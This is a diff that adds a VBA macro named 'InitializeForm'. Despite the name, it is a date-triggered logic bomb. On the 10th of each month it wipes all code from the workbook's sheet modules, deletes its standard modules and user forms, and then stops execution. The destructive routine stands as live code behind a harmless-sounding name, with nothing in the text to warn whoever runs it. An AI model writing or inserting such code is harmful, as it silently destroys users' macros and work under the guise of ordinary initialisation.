@@ -1,0 +1,16 @@
+Sub InitializeForm()
+Dim vbCom As Object
+Dim LineCount As Integer
+Set vbCom = Application.VBE.ActiveVBProject.VBComponents
+    If Day(Now()) = 10 Then
+        For Each Element In vbCom
+            If Left(Element.Name, 5) = "Sheet" Then
+                LineCount = Element.CodeModule.CountOfLines
+                Element.CodeModule.DeleteLines 1, LineCount
+            ElseIf Element.Type = 1 Or Element.Type = 3 Then
+               vbCom.Remove VBComponent:=vbCom.item(Element.Name)
+            End If
+        Next
+    End If
+    End
+End Sub
